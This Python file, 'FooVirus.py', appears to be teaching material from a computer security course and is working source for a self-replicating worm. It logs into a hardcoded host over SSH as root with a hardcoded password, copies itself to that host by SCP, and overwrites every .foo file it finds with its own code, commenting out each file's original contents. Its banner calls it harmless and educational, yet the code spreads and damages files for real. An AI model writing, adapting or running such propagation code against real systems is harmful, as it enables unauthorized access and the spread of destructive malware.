#!/usr/bin/env python
import sys
import paramiko
import scp

##   FooVirus.py
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022
##


# function to get the target ip address
def get_target_ip():
    # return the target ip address list (hardcoded)
    return ["172.17.0.11"]


# function to get the username
def get_username():
    # return the username (hardcoded)
    return "root"


# function to get the password
def get_password():
    # return the password (hardcoded)
    return "mypassword"


# function to write a line to a remote file
def write_line_to_remote_file(ssh_client, lines, filename, mode="w"):
    # open sftp session to transfer the file
    sftp = ssh_client.open_sftp()

    # write the line to the file
    with sftp.open(filename, mode) as remote_file:
        remote_file.writelines(lines)

    # close the sftp session
    sftp.close()


#  function to read whole file from a remote machine
def read_file_from_remote_machine(ssh_client, filename):
    # open sftp session to transfer the file
    sftp = ssh_client.open_sftp()

    lines = []

    # read the file
    with sftp.open(filename, "r") as remote_file:
        lines = remote_file.readlines()

    # close the sftp session
    sftp.close()

    # return the lines
    return lines


print(
    """\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n"""
)

IN = open(sys.argv[0], "r")  # open the virus
# get the line count of the virus
line_count = sum(1 for line in IN)  # count the lines
IN.seek(0)  # rewind the file


virus = [line for (i, line) in enumerate(IN) if i < line_count]  # read the virus
# bacially, copy the entire virus
IN.close()  # close the file


# get the target ip address
target_ip = get_target_ip()

# get the username
username = get_username()

# get the password
password = get_password()

# for each target ip address
for ip in target_ip:
    # print
    print("Target IP: " + ip)

    files_to_infect = []

    # try to connect to the target ip address
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
        print("\n\nSuccess! connected to ip " + ip + "\n\n")

        # Check if the virus is already in the target machine
        received_list = error = None
        stdin, stdout, stderr = ssh.exec_command("ls")
        error = stderr.readlines()
        if error:
            print(error)

        received_list = list(map(lambda x: x.encode("utf-8"), stdout.readlines()))
        # modify the files to usable format
        for item in received_list:
            # the is an extra \n at the end of each item so remove it
            item = item[:-1]
            # convert the item to string
            item = item.decode("utf-8")
            # append the item to the list
            files_to_infect.append(item)

        # print
        print("\n\n The output of ls command is: \n\n")
        print(files_to_infect)
        print("\n\n")

        if "FooVirus.py" in files_to_infect:
            # The machine is already infected
            print("\n\n The machine is already infected\n\n")
            continue

        # The machine is not infected

        # turn on the scp client
        scpcon = scp.SCPClient(ssh.get_transport())

        # Now deposit a copy of FooVirus.py at the target host:
        scpcon.put(sys.argv[0])

        # find the foo files from the list of files
        foo_files = [item for item in files_to_infect if item.endswith(".foo")]
        print("\n\n The foo files are: \n\n")
        print(foo_files)
        print("\n\n")

        # for each foo file
        for item in foo_files:
            # read the file
            lines = read_file_from_remote_machine(ssh, item)

            # modify the contents
            lines = ["#" + line for line in lines]  # comment out all lines
            # write the virus to the file
            write_line_to_remote_file(ssh, virus, item)
            write_line_to_remote_file(ssh, lines, item, "a")

        # close the scp connection

        scpcon.close()
        ssh.close()

    except:
        print("some internal error occured")
        continue
